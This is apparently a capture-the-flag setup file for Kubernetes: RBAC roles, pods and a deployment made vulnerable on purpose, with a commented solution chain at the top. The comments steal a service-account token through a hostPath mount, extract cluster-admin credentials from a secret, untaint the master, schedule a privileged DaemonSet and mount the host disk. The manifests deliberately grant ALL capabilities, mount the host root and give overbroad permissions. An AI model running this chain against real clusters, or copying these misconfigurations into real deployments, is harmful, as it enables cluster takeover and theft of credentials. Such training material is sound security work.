# traverse into sidecar pod with host mount
# steal SA for hashjack
#
# cat /proc/11/root/opt/logs/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/hashjack-token-*/token; echo
# kubectl --token="$(cat /proc/11/root/opt/logs/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/hashjack-token-*/token; echo)" --server=https://kubernetes.default --insecure-skip-tls-verify version

# check the pods in floor-31
# kubectl --token="$(cat /proc/11/root/opt/logs/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/hashjack-token-*/token; echo)" --server=https://kubernetes.default --insecure-skip-tls-verify  get pods -n nakatomi-plaza-floor-31

# delete deployments from floor-31
# kubectl --token="$(cat /proc/11/root/opt/logs/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/hashjack-token-*/token; echo)" --server=https://kubernetes.default --insecure-skip-tls-verify delete deployment moolahro pseudocash sigz

# get cluster admin creds from vault
# kubectl --token="$(cat /proc/11/root/opt/logs/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/hashjack-token-*/token; echo)" --server=https://kubernetes.default --insecure-skip-tls-verify get secrets -n nakatomi-plaza-vault hmmm -o yaml

# pull info from secret
# kubectl --token="$(cat /proc/11/root/opt/logs/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/hashjack-token-*/token; echo)" --server=https://kubernetes.default --insecure-skip-tls-verify get secrets -n nakatomi-plaza-vault hmmm -o json | jq .data.watdis -r | base64 -d | base64 -d | tee /tmp/secret

# cluster admin
# kubectl --token="$(jq -r .token /tmp/secret | base64 -d)" --server=https://kubernetes.default --insecure-skip-tls-verify  get nodes

# untaint master
# kubectl --token="$(jq -r .token /tmp/secret | base64 -d)" --server=https://kubernetes.default --insecure-skip-tls-verify  taint nodes --all node-role.kubernetes.io/master-

# schedule priv daemonset
# { kubectl create deploy nginx --image=nginx --dry-run -o yaml |     sed '/null\|{}\|replicas/d;/status/,$d;s/Deployment/DaemonSet/g' ; printf "        securityContext:\n          privileged: true\n"; echo; } | kubectl --token="$(jq -r .token /tmp/secret | base64 -d)" --server=https://kubernetes.default --insecure-skip-tls-verify apply -f /dev/stdin

# get pods
# kubectl --token="$(jq -r .token /tmp/secret | base64 -d)" --server=https://kubernetes.default --insecure-skip-tls-verify  get pods -o wide

# exec into master pod
# kubectl --token="$(jq -r .token /tmp/secret | base64 -d)" --server=https://kubernetes.default --insecure-skip-tls-verify  exec nginx-jpmv6 -it -- bash

# mount host disk
# mount /dev/xvda1 /mnt/

# get flag
# cat /mnt/root/flag_file

apiVersion: v1
kind: Namespace
metadata:
  name: nakatomi-plaza-floor-31
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: hashjack
  namespace: nakatomi-plaza-floor-31
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: hashjack
  namespace: nakatomi-plaza-floor-31
rules:
  - apiGroups: [ "" ]
    resources: [ "pods", "pods/log" ]
    verbs: [ "get", "watch", "list", "create" ]
  - apiGroups: [ "apps" ]
    resources: [ "deployments" ]
    verbs: [ "create" ]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: hashjack-2
  namespace: nakatomi-plaza-vault
rules:
  - apiGroups: [ "" ]
    resources: [ "pods", "pods/log" ]
    verbs: [ "get", "watch", "list", "create", "escalate" ]
  - apiGroups:
      - ""
    resources:
      - pods/exec
    verbs:
      - create
  - apiGroups: [ "apps" ]
    resources: [ "deployments" ]
    verbs: [ "delete", "deletecollection" ]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: hashjack-3
  namespace: nakatomi-plaza-vault
rules:
  - apiGroups: [ "" ]
    resources: [ "secrets" ]
    verbs: [ "get", "watch", "list", "create" ]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: hashjack
  namespace: nakatomi-plaza-floor-31
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: hashjack
subjects:
  - kind: ServiceAccount
    name: hashjack
    namespace: nakatomi-plaza-floor-31
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: hashjack-2
  namespace: nakatomi-plaza-vault
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: hashjack-2
subjects:
  - kind: ServiceAccount
    name: hashjack
    namespace: nakatomi-plaza-floor-31
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: hashjack-3
  namespace: nakatomi-plaza-vault
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: hashjack-3
subjects:
  - kind: ServiceAccount
    name: hashjack
    namespace: nakatomi-plaza-floor-31
---
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: hashjack
  name: hashjack
  namespace: nakatomi-plaza-floor-31
spec:
  nodeSelector:
    kubernetes.io/hostname: k8s-node-0
  serviceAccountName: hashjack
  containers:
    - command:
        - /bin/bash
        - -xc
        - while sleep $(echo 'H\316\273$\304\247\360\235\224\215\310\272\302\242k // control-plane.io'
          | base64 | tr -dc 0-9); do :; done
      image: bitnami/kubectl:latest
      name: hashjack
      ports:
        - containerPort: 80
  dnsPolicy: ClusterFirst
  restartPolicy: Always
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: starting-point
  namespace: nakatomi-plaza-floor-31
spec:
  selector:
    matchLabels:
      app: starting-point
  template:
    metadata:
      labels:
        app: starting-point
    spec:
      # this allows the horizontal traversal of filesystems and so mount points
      shareProcessNamespace: true
      automountServiceAccountToken: false

      nodeSelector:
        kubernetes.io/hostname: k8s-node-0

      containers:
        - name: audit
          image: bitnami/kubectl:latest
          command: ["sleep"]
          args: ["infinity"]
          securityContext:
            runAsUser: 0
            capabilities:
              add: ["ALL"]
        - name: overseer
          image: ubuntu
          command: ["sleep"]
          args: ["infinity"]
          securityContext:
#            privileged: true
            capabilities:
              add: ["ALL"]
          volumeMounts:
            - mountPath: /opt/logs
              name: logs

      volumes:
        - name: logs
          hostPath:
            # todo(ajm) should work with relative symlink, gke prevented during dev, re-test on prod
            # path: /var/log
            path: /
            type: Directory
